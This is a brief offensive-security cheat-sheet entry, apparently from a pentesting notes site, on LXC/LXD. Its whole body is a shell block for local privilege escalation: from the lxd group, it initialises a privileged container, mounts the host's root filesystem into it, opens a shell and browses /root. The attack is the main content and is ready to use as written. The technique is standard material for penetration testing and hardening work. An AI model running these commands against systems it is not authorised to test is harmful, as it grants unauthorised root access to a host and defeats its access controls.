---
title: Lxc/Lxd
desc: Powerful system container and virtual machine manager.
tags: [Linux, PrivEsc]
alts: []
website: https://github.com/lxc/lxd
render_with_liquid: false
---

## Privilege Escalation

```sh
# Check if you are a member of lxd group
id

# If so, you'll be able to do the privilege escalation
lxc image list
# container_name: arbitrary
lxc init image_name container_name -c security.privileged=true
# device_name: arbitrary
lxc config device add container_name device_name disk source=/ path=/mnt/root recursive=true
lxc start container_name
lxc exec container_name /bin/sh

# Now you are root
id
# Go to the target directory
cd /mnt/root/root

```